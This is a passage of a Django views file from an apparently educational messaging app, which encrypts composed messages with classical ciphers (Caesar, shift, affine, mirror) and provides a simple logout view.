                    # Use your Caesar cipher function to encrypt the content
                    encrypted_content, error = ceasar_cipher(content, encryption_key, encryption_direction)
                    if error:
                        error_message = error
                    else:
                        message.content = encrypted_content
                        message.save()
                        return redirect('compose_message')
                        
                else:
                    error_message = "Please provide both key and direction for Caesar cipher."
               
            elif encryption_method == 'shift':
                    encryption_direction = form.cleaned_data['encryption_direction']

                    if encryption_direction in ('left', 'right'):
                        # Use your Caesar cipher function to encrypt the content
                        encrypted_content = decale_message(content,encryption_direction)
                        message.content = encrypted_content  # Set the message content
                        message.save()
                        return redirect('compose_message')
                    else:
                        error_message = "Please provide both key and direction for Caesar cipher."
                
            elif encryption_method == 'affine':
                encryption_key = form.cleaned_data['encryption_key']
                encryptionb_key = form.cleaned_data['encryptionb_key']

                if encryption_key is not None and encryptionb_key is not None:
                    # Use your Caesar cipher function to encrypt the content
                    encrypted_content,error= chiffrement_affine(content, encryption_key, encryptionb_key)
                    if error:
                        error_message = error
                    else:
                        message.content = encrypted_content
                        message.save()
                        return redirect('compose_message')
                        
                else:
                    error_message = "Please provide both key and direction for Caesar cipher."
            elif encryption_method == 'mirror':
                    encrypted_content = crypter_mots_palindromes(content,crypter)
                    message.content = encrypted_content  # Set the message content
                    message.save()
                    return redirect('compose_message')
            # Save the message after setting the content
            
        else:
            print(form.errors)
    else:
        form = MessageForm()

    users = User.objects.all()
    return render(request, 'compose.html', {'users': users, 'form': form, 'error_message': error_message, 'username':username})


def custom_logout(request):
    # Implement your log out logic here
    # For example, you can clear the user's session or perform other necessary actions

    # Return a JSON response to indicate a successful log out
    logout(request)
    return JsonResponse({'message': 'Logged out successfully'})




# Create your views here.
